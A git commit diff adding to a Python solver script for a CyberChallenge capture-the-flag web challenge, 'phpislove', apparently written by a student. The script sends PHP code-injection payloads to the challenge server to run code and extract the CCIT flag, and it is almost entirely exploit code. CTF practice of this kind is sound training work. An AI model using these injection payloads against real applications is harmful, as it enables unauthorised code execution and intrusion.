7397979f120970e1e8a9ebee889faff6ef22acbc
Pirraa <pirrafranci2004@gmail.com>
2025-04-16 00:15:12 +0200

    nuovi file e slide software security

--- web security/rce/phpislove.py
+++ web security/rce/phpislove.py
@@ -5,3 +5,14 @@ URL = 'http://phpislove.challs.cyberchallenge.it/?a=print_r'
 r = requests.post(URL, data={'code':'};${$variables{0}}{a}(${$strings{4}});?>'})
 
 print(r.content.decode())
+
+
+import requests
+
+url = 'http://phpislove.challs.cyberchallenge.it/'
+data = {
+    'code' : '}print(${$strings{4}});#'
+    }
+r = requests.post(url, data=data)
+print(r.text[r.text.find('CCIT{') : r.text.find('}') + 1])
+
